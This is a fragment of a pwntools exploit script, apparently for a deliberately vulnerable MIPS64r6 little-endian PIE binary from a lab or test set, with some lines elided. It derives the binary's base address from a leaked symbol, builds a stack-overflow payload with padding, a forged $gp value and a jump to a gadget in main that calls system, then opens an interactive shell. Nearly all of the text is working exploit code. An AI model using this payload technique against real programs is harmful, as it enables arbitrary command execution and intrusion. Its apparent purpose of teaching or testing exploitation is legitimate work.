...
build = 'mipsel64r6-glibc-n32'
binary = "mips64r6le_pie_n32"
...
elf.address = vuln_addr - elf.sym["vuln"]       # set the base address of the binary

call_system_addr = elf.sym["main"]+48

payload = flat(
    b'a'*0x28,                                  # padding
    p64(vuln_addr+0x27740),                     # $gp
    b'b'*8,                                     # padding for $s8
    p64(call_system_addr),                      # lw; move; jalr gadget to call system
)
p.sendline(payload)
p.interactive()
p.close()
